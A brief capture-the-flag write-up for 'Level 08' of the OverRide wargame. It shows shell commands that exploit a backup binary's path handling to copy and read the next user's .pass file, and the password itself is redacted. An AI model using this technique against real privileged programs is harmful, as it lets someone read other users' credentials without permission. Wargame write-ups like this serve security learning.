# Level 08

This one is more of a snow-crash type exploit as we don't actually override anything.
One thing we can note in the sourcefile is that our argv[1] gets used twice. Once as an absolute path, and one copied right after `./backups`.

What I did was the following:
```shell
cd /tmp
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
[redacted]
```